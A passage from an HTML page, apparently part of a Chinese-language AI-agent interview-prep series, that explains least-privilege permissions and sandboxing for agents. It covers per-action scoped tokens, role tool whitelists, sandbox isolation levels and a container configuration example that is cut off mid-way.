@@ -1,0 +1,778 @@
+<!doctype html>
+<html lang="zh-CN" data-register="paper">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light">
+  <meta name="referrer" content="no-referrer">
+  <meta name="generator" content="agent-interview-100-html v1">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; base-uri 'none'; form-action 'none'; object-src 'none'; frame-src 'none'">
+  <title>Agent 的权限最小化原则与沙箱执行 · Agent Interview 100</title>
+  <style>
+/* 全库公共壳 v1 —— 纸色、系统字体、离线单文件 */
+:root {
+  color-scheme: light;
+  --bg: #f5f3ed;
+  --surface: #fcfcfb;
+  --surface-soft: #f1f0eb;
+  --ink: #202421;
+  --text-dim: #5d625d;
+  --border: #dcded6;
+  --border-bright: #858d85;
+  --accent: #194f87;
+  --accent-dim: #eaf1f8;
+  --series-1: #2a78d6;
+  --series-2: #c2410c;
+  --series-3: #2e7d32;
+  --series-4: #6b21a8;
+  --focus: #194f87;
+  --t-label: 12px;
+  --t-small: 14px;
+  --t-body: 16px;
+  --t-h3: 19px;
+  --t-h2: clamp(23px, 2.2vw, 30px);
+  --t-h1: clamp(34px, 4vw, 54px);
+  --s-1: 4px;
+  --s-2: 8px;
+  --s-3: 12px;
+  --s-4: 20px;
+  --s-5: 28px;
+  --s-6: 40px;
+  --s-7: 56px;
+  --s-8: 80px;
+  --r-1: 6px;
+  --r-2: 14px;
+  --fast: 140ms;
+  --med: 220ms;
+  --ease: ease-out;
+  --sans: "Avenir Next", "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+  --serif: "Iowan Old Style", "Baskerville", "Songti SC", "STSong", serif;
+  --mono: "SFMono-Regular", Consolas, "Liberation Mono", monospace;
+}
+*, *::before, *::after { box-sizing: border-box; }
+[hidden] { display: none !important; }
+html { scroll-behavior: smooth; scroll-padding-top: 24px; }
+body { margin: 0; background: var(--bg); color: var(--ink); font: var(--t-body)/1.7 var(--sans); -webkit-font-smoothing: antialiased; }
+button, input { font: inherit; }
+button { color: inherit; cursor: pointer; touch-action: manipulation; }
+button:disabled { cursor: default; }
+button, a, input, summary { -webkit-tap-highlight-color: transparent; }
+:focus-visible { outline: 3px solid var(--focus); outline-offset: 4px; }
+a { color: var(--accent); text-underline-offset: 4px; overflow-wrap: anywhere; }
+p, h1, h2, h3, figure { margin: 0; }
+h1, h2, h3 { text-wrap: balance; }
+p { text-wrap: pretty; }
+code, pre, .mono { font-family: var(--mono); }
+code { font-size: .92em; }
+svg { display: block; max-width: 100%; height: auto; }
+.sr-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip-path: inset(50%); white-space: nowrap; border: 0; }
+.skip-link { position: fixed; top: 12px; left: 12px; z-index: 20; transform: translateY(-180%); padding: 10px 18px; background: var(--surface); border: 1px solid var(--ink); border-radius: var(--r-1); }
+.skip-link:focus { transform: translateY(0); }
+.shell { width: min(1220px, calc(100% - 96px)); margin-inline: auto; }
+.masthead { min-height: 82px; display: flex; align-items: center; justify-content: space-between; gap: var(--s-4); border-bottom: 1px solid var(--border); font-size: var(--t-label); }
+.brand { display: flex; align-items: center; gap: 10px; letter-spacing: .1em; font-weight: 700; }
+.brand svg { width: 25px; height: 25px; flex: 0 0 auto; }
+.brand a { color: inherit; text-decoration: none; }
+.edition { color: var(--text-dim); letter-spacing: .05em; text-align: right; }
+.page-nav { min-height: 54px; display: flex; align-items: center; justify-content: space-between; gap: var(--s-3); flex-wrap: wrap; border-bottom: 1px solid var(--border); font-size: var(--t-label); color: var(--text-dim); }
+.page-nav a { display: inline-flex; align-items: center; min-height: 44px; color: var(--accent); }
+.page-nav-pager { display: flex; gap: var(--s-3); align-items: center; }
+.page-nav-pager .disabled { color: #8b908b; }
+.hero { padding: var(--s-7) 0 var(--s-6); display: grid; grid-template-columns: 1.05fr 1fr; gap: var(--s-7); align-items: end; }
+.eyebrow { color: var(--text-dim); font-size: var(--t-label); letter-spacing: .12em; margin-bottom: var(--s-3); }
+h1 { font: 600 var(--t-h1)/1.18 var(--serif); letter-spacing: -.025em; }
+.lead { font-size: 18px; line-height: 1.9; max-width: 31em; }
+.definition { margin-top: var(--s-3); color: var(--text-dim); font-size: var(--t-small); max-width: 34em; }
+.definition strong { color: var(--ink); font-weight: 600; }
+.hero-meta { display: flex; flex-wrap: wrap; gap: var(--s-2); margin-top: var(--s-4); }
+.pill { display: inline-flex; align-items: center; min-height: 28px; padding: 2px 10px; border: 1px solid var(--border-bright); border-radius: 999px; font-size: 11px; color: var(--text-dim); background: var(--surface); }
+.walkthrough { background: var(--surface); border: 1px solid var(--border); border-radius: var(--r-2); }
+.player-top { padding: var(--s-4) var(--s-5); display: flex; align-items: center; justify-content: space-between; gap: var(--s-4); border-bottom: 1px solid var(--border); flex-wrap: wrap; }
+.player-label { font-size: var(--t-small); font-weight: 600; }
+.player-label small { color: var(--text-dim); font-weight: 400; margin-left: var(--s-3); }
+.controls { display: flex; gap: var(--s-2); align-items: center; flex-wrap: wrap; }
+.button { min-height: 44px; padding: 9px 16px; border: 1px solid var(--border-bright); background: transparent; border-radius: var(--r-1); font-size: var(--t-small); white-space: nowrap; transition: background var(--fast) var(--ease); }
+.button:hover:not(:disabled) { background: var(--surface-soft); }
+.button-primary { background: var(--ink); color: var(--surface); border-color: var(--ink); }
+.button-primary:hover:not(:disabled) { background: #3a423b; }
+.button-quiet { border-color: transparent; color: var(--text-dim); }
+.button:disabled { color: #747a74; background: var(--surface-soft); border-color: var(--border); }
+.stage-nav { padding: var(--s-4) var(--s-5) 0; }
+.stage-nav ol { list-style: none; margin: 0; padding: 0; display: grid; grid-template-columns: repeat(var(--stages, 5), minmax(0, 1fr)); gap: var(--s-2); }
+.stage-button { width: 100%; display: flex; align-items: center; justify-content: center; gap: 9px; min-height: 48px; padding: 8px; border: 1px solid transparent; border-radius: var(--r-1); background: transparent; font-size: var(--t-small); color: var(--text-dim); }
+.stage-button:hover { background: var(--surface-soft); }
+.stage-button[aria-current="step"] { background: var(--accent-dim); border-color: #9eb4c9; color: var(--ink); font-weight: 600; }
+.stage-number { display: inline-grid; place-items: center; width: 24px; height: 24px; border: 1px solid var(--border-bright); border-radius: 50%; font: 12px/1 var(--mono); flex: 0 0 auto; }
+[aria-current="step"] .stage-number { color: white; background: var(--accent); border-color: var(--accent); }
+.scene-caption { padding: 18px var(--s-6) var(--s-5); }
+.figure-index { color: var(--text-dim); font: var(--t-label)/1.5 var(--mono); margin-bottom: var(--s-2); }
+.scene-caption h2 { font-size: var(--t-h2); line-height: 1.4; font-weight: 600; letter-spacing: -.02em; }
+.scene-caption p:last-child { color: var(--text-dim); font-size: var(--t-small); margin-top: var(--s-2); max-width: 67em; }
+.scene-host { padding: 0 var(--s-6) var(--s-6); }
+.scene { animation: arrive var(--med) var(--ease); }
+@keyframes arrive { from { opacity: .4; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
+.demo-note { border-top: 1px solid var(--border); padding-top: var(--s-4); margin-top: var(--s-5); color: var(--text-dim); font-size: var(--t-label); }
+.walkthrough-foot { padding: var(--s-3) var(--s-5); border-top: 1px solid var(--border); display: flex; justify-content: space-between; gap: var(--s-3); font-size: 11px; color: var(--text-dim); flex-wrap: wrap; }
+.reading { padding-block: var(--s-8) var(--s-7); }
+.reading-header { display: grid; grid-template-columns: 1fr 1fr; gap: var(--s-6); align-items: end; }
+.reading h2 { font: 600 var(--t-h2)/1.5 var(--serif); }
+.reading-intro { font-size: var(--t-small); color: var(--text-dim); max-width: 35em; }
+.prose { margin-top: var(--s-6); }
+.prose h3 { font-size: var(--t-h3); line-height: 1.5; font-weight: 600; margin-top: var(--s-6); }
+.prose h3:first-child { margin-top: 0; }
+.prose p, .prose li { font-size: var(--t-small); }
+.prose p { max-width: 48em; margin-top: var(--s-3); }
+.prose ul, .prose ol { margin-top: var(--s-3); padding-left: 1.3em; max-width: 48em; }
+.prose li { margin-block: 6px; padding-left: 3px; }
+.prose strong { font-weight: 600; }
+.section-rule { border: 0; border-top: 1px solid var(--border); margin-block: var(--s-6); }
+.callout { border: 1px solid var(--border); background: var(--surface); border-radius: var(--r-1); padding: var(--s-4) var(--s-5); margin-top: var(--s-4); }
+.callout p { font-size: var(--t-small); max-width: 52em; }
+.callout p + p { margin-top: var(--s-2); }
+.callout-label { font: var(--t-label)/1.8 var(--mono); color: var(--text-dim); letter-spacing: .06em; margin-bottom: var(--s-1); }
+.quote { border-left: 3px solid var(--accent); padding: var(--s-2) 0 var(--s-2) var(--s-4); margin-top: var(--s-4); font: 500 19px/1.7 var(--serif); max-width: 34em; }
+.table-wrap { overflow-x: auto; margin-top: var(--s-4); border: 1px solid var(--border); border-radius: var(--r-1); background: var(--surface); }
+table.data { width: 100%; border-collapse: collapse; font-size: var(--t-small); font-variant-numeric: tabular-nums; }
+table.data th, table.data td { padding: 10px 12px; border-bottom: 1px solid var(--border); text-align: left; vertical-align: top; }
+table.data thead th { color: var(--text-dim); font-size: var(--t-label); font-weight: 500; background: var(--surface-soft); white-space: nowrap; }
+table.data tbody tr:last-child td, table.data tbody tr:last-child th { border-bottom: 0; }
+table.data td.num, table.data th.num { text-align: right; font-family: var(--mono); font-size: 12px; white-space: nowrap; }
+table.data code { overflow-wrap: anywhere; }
+pre { background: #ebede7; border-radius: var(--r-1); padding: var(--s-4); font-size: 12px; line-height: 1.8; overflow-x: auto; margin-top: var(--s-3); tab-size: 4; }
+pre code { font-size: inherit; }
+.code-label { font: var(--t-label)/1.8 var(--mono); color: var(--text-dim); margin-top: var(--s-4); }
+details { margin-top: var(--s-4); border-top: 1px solid var(--border); }
+summary { cursor: pointer; min-height: 44px; padding-block: 10px; font-weight: 500; font-size: var(--t-small); }
+summary::marker { color: var(--text-dim); }
+details pre { margin-top: 0; }
+.source-section { padding-bottom: var(--s-7); }
+.source-section > .eyebrow { margin-bottom: var(--s-2); }
+.source-heading { font-size: 21px; font-weight: 600; line-height: 1.5; }
+.source-summary { font-size: var(--t-small); color: var(--text-dim); margin-top: var(--s-2); max-width: 52em; }
+.source-content { padding: 0 0 var(--s-4); }
+.source-content h3 { font-size: var(--t-body); margin-bottom: var(--s-3); font-weight: 600; margin-top: var(--s-4); }
+.source-content p, .source-content li { font-size: var(--t-small); }
+.source-content ul { margin: 0; padding-left: 1.2em; }
+.source-content li { padding-left: 4px; margin-bottom: var(--s-3); }
+.source-footnote { color: var(--text-dim); margin-top: var(--s-3); max-width: 52em; }
+.misconception { display: grid; grid-template-columns: 145px 1fr; gap: var(--s-6); padding: var(--s-5) 0; margin-top: var(--s-6); border-block: 1px solid var(--border); }
+.misconception-label { font: var(--t-label)/1.8 var(--mono); color: var(--text-dim); }
+.misconception h3 { font-size: var(--t-h3); font-weight: 600; line-height: 1.5; }
+.misconception p { font-size: var(--t-small); color: var(--text-dim); margin-top: var(--s-2); max-width: 55em; }
+.misconception p strong { color: var(--ink); }
+footer { display: flex; justify-content: space-between; gap: var(--s-4); padding-block: var(--s-4) var(--s-5); border-top: 1px solid var(--border); color: var(--text-dim); font-size: 11px; flex-wrap: wrap; }
+footer code { font-size: 11px; overflow-wrap: anywhere; }
+@media (min-width: 1200px) { .reading-header h2 { max-width: 16em; } }
+@media (max-width: 1000px) {
+  .shell { width: calc(100% - 56px); }
+  .hero { gap: var(--s-5); }
+  .scene-caption, .scene-host { padding-inline: var(--s-5); }
+}
+@media (max-width: 720px) {
+  .shell { width: calc(100% - 32px); }
+  .masthead { min-height: 64px; gap: var(--s-2); }
+  .brand { font-size: 10px; letter-spacing: .055em; gap: 7px; }
+  .edition { font-size: 10px; letter-spacing: 0; max-width: 55%; }
+  .page-nav { font-size: 11px; }
+  .hero { grid-template-columns: 1fr; gap: var(--s-4); padding-block: 30px; }
+  h1 { font-size: 36px; }
+  .hero h1 br { display: none; }
+  .lead { font-size: var(--t-body); line-height: 1.8; }
+  .definition { font-size: 12px; line-height: 1.8; margin-top: var(--s-2); }
+  .eyebrow { font-size: 11px; margin-bottom: var(--s-2); }
+  .player-top { padding: var(--s-3); gap: var(--s-2); }
+  .player-label { font-size: var(--t-label); }
+  .player-label small { display: none; }
+  .controls { gap: 4px; }
+  .button { padding: 8px 10px; font-size: 12px; }
+  .button-quiet { padding-inline: 7px; }
+  .stage-nav { padding: var(--s-3) var(--s-3) 0; }
+  .stage-nav ol { gap: 3px; }
+  .stage-button { flex-direction: column; gap: 5px; padding: 8px 3px; font-size: 12px; line-height: 1.4; }
+  .stage-number { width: 22px; height: 22px; font-size: 11px; }
+  .scene-caption { padding: var(--s-4); }
+  .scene-caption h2 { font-size: 23px; }
+  .scene-caption p:last-child { font-size: 13px; }
+  .scene-host { padding: 0 var(--s-4) var(--s-5); }
+  .walkthrough-foot { padding: var(--s-3) var(--s-4); flex-direction: column; gap: 3px; }
+  .reading { padding-block: var(--s-7) var(--s-6); }
+  .reading-header { grid-template-columns: 1fr; gap: var(--s-3); }
+  .reading h2 { font-size: 25px; }
+  .misconception { grid-template-columns: 1fr; gap: var(--s-3); margin-top: var(--s-5); }
+  .misconception h3 { font-size: 18px; }
+  .source-heading { font-size: 19px; }
+  footer { flex-direction: column; gap: var(--s-2); }
+  .quote { font-size: 17px; }
+}
+@media (prefers-reduced-motion: reduce) {
+  html { scroll-behavior: auto; }
+  *, *::before, *::after { animation: none !important; transition: none !important; }
+}
+@media (forced-colors: active) {
+  .stage-button[aria-current="step"] { border: 2px solid Highlight; }
+  .pill { border-color: CanvasText; }
+}
+@media print {
+  body { background: white; }
+  .shell { width: 100%; }
+  .controls, .stage-nav, .skip-link, .page-nav { display: none !important; }
+  .scene[hidden] { display: block !important; margin-bottom: 24px; }
+  .scene { break-inside: avoid; }
+  .walkthrough { border-color: #888; }
+  .hero { padding-top: 20px; }
+  .reading { padding-block: 30px; }
+  a { color: inherit; }
+  details { display: block; }
+  details > summary { display: none; }
+  details:not([open]) > *:not(summary) { display: revert; }
+}
+
+    .button:disabled, .button[disabled] { color: var(--text-dim); }
+/* 081 最小权限与沙箱 */
+  .lp-stage { padding: var(--s-5) var(--s-6); }
+  .lp-tabs { display: flex; flex-wrap: wrap; gap: 6px; }
+  .lp-tab { min-height: 40px; padding: 7px 12px; border: 1px solid var(--border); border-radius: var(--r-1); background: var(--surface); font-size: 12px; color: var(--text-dim); }
+  .lp-tab:hover { background: var(--surface-soft); }
+  .lp-tab[aria-pressed="true"] { background: var(--accent-dim); border-color: var(--accent); color: var(--ink); font-weight: 600; }
+  .lp-card { margin-top: var(--s-4); border: 1px solid var(--border-bright); border-left: 4px solid var(--accent); border-radius: var(--r-1); background: var(--surface); padding: var(--s-5); animation: arrive var(--med) var(--ease); }
+  .lp-card h2 { font-size: var(--t-h2); line-height: 1.4; font-weight: 600; }
+  .lp-request { margin-top: var(--s-3); padding: var(--s-3) var(--s-4); border-radius: var(--r-1); background: var(--surface-soft); font: 12px/1.8 var(--mono); color: var(--ink); white-space: pre-wrap; overflow-wrap: anywhere; }
+  .lp-request-label { margin-top: var(--s-3); font: 11px/1.6 var(--mono); color: var(--text-dim); letter-spacing: .04em; }
+  .lp-phase { margin-top: var(--s-4); border-top: 1px solid var(--border); padding-top: var(--s-4); }
+  .lp-phase h3 { font-size: var(--t-h3); line-height: 1.5; }
+  .lp-verdict { display: flex; flex-wrap: wrap; gap: var(--s-2); align-items: center; margin-top: var(--s-2); }
+  .lp-badge { display: inline-flex; align-items: center; min-height: 24px; padding: 1px 9px; border-radius: 999px; border: 1px solid var(--border); background: var(--surface-soft); color: var(--text-dim); font-size: 11px; white-space: nowrap; }
+  .lp-badge.ok { background: #e9f1e7; border-color: #7f9b7c; color: #1f4d24; }
+  .lp-badge.bad { background: #fbe9e7; border-color: #b04a3f; color: #7a1f18; }
+  .lp-badge.warn { background: #fff4df; border-color: #a9741f; color: #6b4300; }
+  .lp-reason { margin-top: var(--s-3); font-size: var(--t-small); max-width: 52em; }
+  .lp-token { margin-top: var(--s-3); padding: var(--s-3) var(--s-4); border: 1px solid var(--border); border-radius: var(--r-1); background: var(--surface-soft); font-size: 12px; line-height: 1.8; color: var(--text-dim); }
+  .lp-token b { color: var(--ink); }
+  .lp-full { margin-top: var(--s-3); padding: var(--s-3) var(--s-4); border-left: 4px solid #b04a3f; border-radius: var(--r-1); background: #fff7f6; font-size: 12px; line-height: 1.7; color: #7a1f18; }
+  .lp-full b { color: #5b1510; }
+  .lp-checks { margin-top: var(--s-3); display: grid; gap: var(--s-2); }
+  .lp-check { display: grid; grid-template-columns: 7em 1fr auto; gap: var(--s-3); align-items: start; padding: var(--s-3) var(--s-4); border: 1px solid var(--border); border-radius: var(--r-1); background: var(--surface-soft); font-size: 12px; line-height: 1.7; }
+  .lp-check b { font: 600 11px/1.8 var(--mono); color: var(--accent); }
+  .lp-check p { color: var(--text-dim); }
+  .lp-check span { font-size: 11px; white-space: nowrap; padding: 1px 8px; border-radius: 999px; border: 1px solid var(--border); background: var(--surface); color: var(--text-dim); }
+  .lp-check span.ok { background: #e9f1e7; border-color: #7f9b7c; color: #1f4d24; }
+  .lp-check span.bad { background: #fbe9e7; border-color: #b04a3f; color: #7a1f18; }
+  .lp-check span.warn { background: #fff4df; border-color: #a9741f; color: #6b4300; }
+  .lp-outcome { margin-top: var(--s-3); padding: var(--s-3) var(--s-4); border-radius: var(--r-1); border: 1px solid var(--border-bright); background: var(--surface); font-size: 13px; line-height: 1.7; }
+  .lp-outcome.ok { border-color: #7f9b7c; background: #f6faf4; }
+  .lp-outcome.bad { border-color: #b04a3f; background: #fff7f6; }
+  .lp-outcome.warn { border-color: #a9741f; background: #fff8ec; }
+  .lp-hidden { margin-top: var(--s-4); padding: var(--s-4); border: 1px dashed var(--border-bright); border-radius: var(--r-1); font-size: 12px; line-height: 1.7; color: var(--text-dim); }
+  .lp-layers { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: var(--s-3); margin-top: var(--s-4); }
+  .lp-layer { border: 1px solid var(--border); border-radius: var(--r-1); background: var(--surface); padding: var(--s-4); min-width: 0; }
+  .lp-layer h3 { margin-top: 0; font-size: 15px; }
+  .lp-layer p { margin-top: var(--s-2); font-size: 12px; line-height: 1.7; color: var(--text-dim); }
+  .lp-layer .lp-tag { display: inline-block; font: 10px/1.5 var(--mono); color: var(--accent); letter-spacing: .04em; }
+  .lp-table td, .lp-table th { vertical-align: top; }
+  .lp-table td:first-child, .lp-table th:first-child { min-width: 8.5em; }
+  .lp-sandbox { min-width: 680px; }
+  .lp-classify { min-width: 620px; }
+  .lp-flow { display: grid; gap: var(--s-2); margin-top: var(--s-4); }
+  .lp-flow-row { display: grid; grid-template-columns: 6em 1fr; gap: var(--s-3); padding: var(--s-3) var(--s-4); border: 1px solid var(--border); border-radius: var(--r-1); background: var(--surface); }
+  .lp-flow-row b { font: 600 11px/1.7 var(--mono); color: var(--accent); }
+  .lp-flow-row p { font-size: 12px; line-height: 1.7; color: var(--text-dim); }
+  .lp-redact { margin-top: var(--s-3); padding: var(--s-3) var(--s-4); border: 1px solid #a9741f; border-radius: var(--r-1); background: #fff8ec; font: 12px/1.9 var(--mono); color: #5c3a08; overflow-wrap: anywhere; }
+  .lp-redact b { color: #3f2906; }
+  .lp-warn { border: 1px solid #b45309; border-radius: var(--r-1); background: #fff8ec; padding: var(--s-4) var(--s-5); margin-top: var(--s-4); }
+  .lp-warn .lp-warn-label { font: 600 11px/1.6 var(--mono); color: #8a4708; letter-spacing: .04em; }
+  .lp-warn p { font-size: var(--t-small); max-width: 52em; margin-top: 4px; }
+  @media (max-width: 880px) {
+    .lp-layers { grid-template-columns: 1fr; }
+  }
+  @media (max-width: 760px) {
+    .lp-stage { padding: var(--s-4); }
+    .lp-card { padding: var(--s-4); }
+    .lp-card h2 { font-size: 22px; }
+    .lp-check { grid-template-columns: 1fr auto; }
+    .lp-check p { grid-column: 1 / -1; grid-row: 2; }
+    .lp-flow-row { grid-template-columns: 1fr; gap: 2px; }
+  }
+  </style>
+</head>
+<body>
+  <a class="skip-link" href="#main-content">跳到正文</a>
+  <div class="shell">
+    <header class="masthead">
+      <div class="brand"><svg viewBox="0 0 28 28" fill="none" aria-hidden="true"><path d="M4 14h6m0 0V5h8m-8 9v9h8m0-18h6m-6 18h6" stroke="currentColor" stroke-width="1.5"/><circle cx="4" cy="14" r="2.5" fill="var(--bg)" stroke="currentColor" stroke-width="1.5"/><rect x="18" y="2" width="7" height="6" rx="1" fill="var(--bg)" stroke="currentColor" stroke-width="1.5"/><rect x="18" y="20" width="7" height="6" rx="1" fill="var(--bg)" stroke="currentColor" stroke-width="1.5"/></svg><a href="../index.html"><span>AGENT INTERVIEW 100</span></a></div>
+      <span class="edition">081 / 最小权限与沙箱</span>
+    </header>
+    <nav class="page-nav" aria-label="整库导航">
+      <a href="../index.html">← 整库索引</a>
+      <span>本批第 6 / 20 页 · 模板 v1</span>
+      <div class="page-nav-pager"><a href="079-guardrails-basics.html">← 上一页 · 什么是 Guardrails？如何为…</a><a href="082-hallucination-detection.html">下一页 → · 如何检测和缓解 Agent 的幻觉（…</a></div>
+    </nav>
+<main id="main-content">
+  <header class="hero">
+    <div>
+      <p class="eyebrow">中级 · Safety &amp; Alignment · 可交互讲解</p>
+      <h1>权限跟着动作走，<br>不跟着 Agent 走。</h1>
+    </div>
+    <div>
+      <p class="lead">给 Agent 一个固定角色，无法覆盖它运行时临时决定要做的事。更稳的做法是：每个动作单独授权，令牌限时、限范围，执行进沙箱，出网过白名单。</p>
+      <p class="definition">传统静态最小权限不够，因为 Agent 的工具组合无法预先穷举。原文的答案是<strong>动态运行时权限</strong>：策略引擎逐次评估，颁发最小权限令牌（如 60 秒过期）。本页不执行任何命令、不启动容器；脱敏示例是<strong>固定文本</strong>，不接触真实数据。</p>
+      <div class="hero-meta"><span class="pill">中级</span><span class="pill">Safety &amp; Alignment</span><span class="pill">最小权限</span><span class="pill">固定教学数据</span></div>
+    </div>
+  </header>
+
+  <section class="walkthrough" id="explainer" aria-label="权限判定台：请求、授权与沙箱出口">
+    <div class="player-top">
+      <div class="player-label">权限判定台 <small>请求 → 授权 → 沙箱与出口</small></div>
+      <div class="controls" role="group" aria-label="权限判定控制">
+        <button type="button" class="button button-quiet" id="lp-reset">重新开始</button>
+        <button type="button" class="button" id="lp-back" disabled>上一步</button>
+        <button type="button" class="button button-primary" id="lp-next">判定权限</button>
+      </div>
+    </div>
+    <div class="lp-stage scene" data-scene="least-privilege-triage">
+      <div class="lp-tabs" role="group" aria-label="固定请求选择">
+        <button type="button" class="lp-tab" data-req="0" aria-pressed="true">读文档</button>
+        <button type="button" class="lp-tab" data-req="1" aria-pressed="false">写工作区</button>
+        <button type="button" class="lp-tab" data-req="2" aria-pressed="false">发邮件</button>
+        <button type="button" class="lp-tab" data-req="3" aria-pressed="false">外发数据</button>
+        <button type="button" class="lp-tab" data-req="4" aria-pressed="false">删数据库记录</button>
+      </div>
+      <div class="lp-card">
+        <p class="figure-index" id="lp-index">请求 1 / 5 · 步骤 1 / 3</p>
+        <h2 id="lp-title-text"></h2>
+        <p class="lp-request-label">固定请求（仅文本，不执行）</p>
+        <div class="lp-request" id="lp-request"></div>
+
+        <div class="lp-phase" id="lp-permission" hidden>
+          <h3>权限判定</h3>
+          <div class="lp-verdict" id="lp-verdict"></div>
+          <p class="lp-reason" id="lp-reason"></p>
+          <div class="lp-token" id="lp-token"></div>
+          <div class="lp-full" id="lp-full"></div>
+        </div>
+
+        <div class="lp-phase" id="lp-exec" hidden>
+          <h3>沙箱与出口</h3>
+          <div class="lp-checks" id="lp-checks"></div>
+          <div class="lp-outcome" id="lp-outcome"></div>
+        </div>
+
+        <div class="lp-hidden" id="lp-hidden">先看请求，点“判定权限”才会出现授权结果；再点一次才进入沙箱与出口检查。未到达的步骤不会提前显示。</div>
+      </div>
+      <p class="demo-note">固定教学数据：角色、工具白名单、令牌 TTL、沙箱参数与出口规则均为本页预设，用于演示“请求 → 授权 → 执行前检查”的流程；不执行命令、不启动容器、不连接任何系统。</p>
+    </div>
+    <div class="walkthrough-foot"><span>固定权限演示 · 不执行任何动作</span><span id="lp-state">请求 1 / 5 · 步骤 1 / 3</span></div>
+  </section>
+  <p id="lp-announcement" class="sr-only" role="status" aria-live="polite" aria-atomic="true"></p>
+
+  <section class="reading" aria-labelledby="lp-why-title">
+    <div class="reading-header">
+      <div><p class="eyebrow">一 · 为什么传统最小权限不够</p><h2 id="lp-why-title">部署时定好的权限，<br>追不上运行时的动作。</h2></div>
+      <p class="reading-intro">传统服务的行为路径可预测，权限可以在部署时写死。Agent 在运行时决定调哪个工具，同一角色在不同任务里需要的权限也不同。</p>
+    </div>
+    <div class="prose">
+      <div class="table-wrap">
+        <table class="data lp-table">
+          <caption class="sr-only">传统软件与 Agent 在权限管理上的差异</caption>
+          <thead><tr><th scope="col">维度</th><th scope="col">传统服务</th><th scope="col">Agent</th></tr></thead>
+          <tbody>
+            <tr><th scope="row">权限确定时机</th><td>部署时静态确定。</td><td>运行时动态决定，任务之间还会变。</td></tr>
+            <tr><th scope="row">调用模式</th><td>固定 API 路径，可预先枚举。</td><td>工具组合无法预先穷举。</td></tr>
+            <tr><th scope="row">被攻击后的行为</th><td>仍在代码路径内。</td><td>被 Prompt Injection 后行为不可预测。</td></tr>
+            <tr><th scope="row">需要什么</th><td>角色 + 静态策略。</td><td>动态、运行时、上下文感知的权限管理。</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>原文的判断很直接：<strong>权限必须在 Agent 外部强制执行</strong>，不能依赖 Agent 自己判断“该不该用这个工具”。被注入之后，Agent 的判断本身就是攻击面。OWASP 的 Agent 安全清单也把“工具滥用与权限提升”列为核心威胁，这正是权限要按动作、在 Agent 外部判定的原因。</p>
+    </div>
+  </section>
+
+  <section class="reading" aria-labelledby="lp-patterns-title">
+    <div class="reading-header">
+      <div><p class="eyebrow">二 · 三种实现模式</p><h2 id="lp-patterns-title">白名单、短会话、<br>逐次令牌。</h2></div>
+      <p class="reading-intro">原文给了三层递进：基于角色的工具白名单、按任务创建的最小权限会话、AI Identity Gateway 的逐次授权。越往后，权限越贴近“这一次动作”。</p>
+    </div>
+    <div class="prose">
+      <div class="lp-layers">
+        <div class="lp-layer"><span class="lp-tag">模式 1</span><h3>角色工具白名单</h3><p>research_agent 只允许 web_search、read_document，明确拒绝 write_file、send_email、database_write；code_agent 只允许 read_file、write_file、run_tests。</p></div>
+        <div class="lp-layer"><span class="lp-tag">模式 2</span><h3>动态最小权限会话</h3><p>每个任务先分析所需工具，只授予这些工具；API Key 限定 scope，TTL 300 秒；资源上限 20 次调用、$1、120 秒。</p></div>
+        <div class="lp-layer"><span class="lp-tag">模式 3</span><h3>AI Identity Gateway</h3><p>每次操作都过策略引擎，评估 agent、action、context、user permissions；允许时颁发单次操作令牌，TTL 60 秒。</p></div>
+      </div>
+      <p>三种模式不是替代关系，可以叠加：角色白名单挡住明显越界，任务会话限制范围，网关在每次动作前再核对上下文。</p>
+      <p class="code-label">原文动态授权示例（Python，仅展示，不执行）</p>
+      <pre><code>def request_with_dynamic_auth(self, action, context):
+    policy_result = self.policy_engine.evaluate(
+        agent_id=self.id,
+        action=action,
+        context=context,
+        user_permissions=context.user.permissions,
+    )
+    if policy_result.allowed:
+        token = self.issue_scoped_token(
+            permissions=policy_result.granted_permissions,
+            ttl=60,  # 单次操作，60 秒过期
+        )
+        return self.execute_with_token(action, token)
+    else:
+        return {"denied": True, "reason": policy_result.reason}</code></pre>
+      <p>JIT（Just-In-Time）提权是同一思路的延伸：Agent 请求临时权限 → 策略引擎评估 → 必要时人工审批 → 授予限时令牌，5 分钟后自动撤销，避免永久提权。</p>
+    </div>
+  </section>
+
+  <section class="reading" aria-labelledby="lp-sandbox-title">
+    <div class="reading-header">
+      <div><p class="eyebrow">三 · 沙箱四层</p><h2 id="lp-sandbox-title">从进程到一次性环境，<br>隔离强度递增。</h2></div>
+      <p class="reading-intro">原文把沙箱分四层：进程隔离、容器、gVisor / microVM、临时性环境。层数越高，隔离越强，启动与运维成本也越高。</p>
+    </div>
+    <div class="prose">
+      <div class="table-wrap">
+        <table class="data lp-sandbox">
+          <caption class="sr-only">四级沙箱的技术、适用场景与限制</caption>
+          <thead><tr><th scope="col">层级</th><th scope="col">技术</th><th scope="col">适用</th><th scope="col">限制 / 优势</th></tr></thead>
+          <tbody>
+            <tr><th scope="row">Level 1 · 进程隔离</th><td>subprocess + 资源限制（ulimit）。</td><td>简单的代码执行。</td><td>共享内核，隔离不完全。</td></tr>
+            <tr><th scope="row">Level 2 · 容器</th><td>Docker / Podman。</td><td>工具执行、文件操作。</td><td>文件系统、网络、资源可隔离；每次工具调用独立容器。</td></tr>
+            <tr><th scope="row">Level 3 · 内核级</th><td>gVisor（用户态内核）/ Firecracker（microVM）。</td><td>高安全要求的代码执行。</td><td>即使容器逃逸也难影响宿主；AWS Lambda、Google Cloud Run 的底层技术。</td></tr>
+            <tr><th scope="row">Level 4 · 临时环境</th><td>每次执行创建全新环境，执行后销毁。</td><td>最高安全要求。</td><td>无状态残留，每次执行互不影响；InfoQ 案例的 ephemeral runner + 强制销毁。</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p class="code-label">原文沙箱配置示例（仅展示，不执行）</p>
+      <pre><code>container = await self.create_container(
+    image=f"sandbox-{language}:latest",
+    network_mode="none",          # 禁止网络访问
+    read_only=True,               # 只读文件系统
+    mem_limit="256m",             # 内存限制
+    cpu_quota=50000,              # CPU 限制
+    timeout=30,                   # 超时限制
+    volumes={
+        "/tmp/workspace": {       # 只允许写临时目录
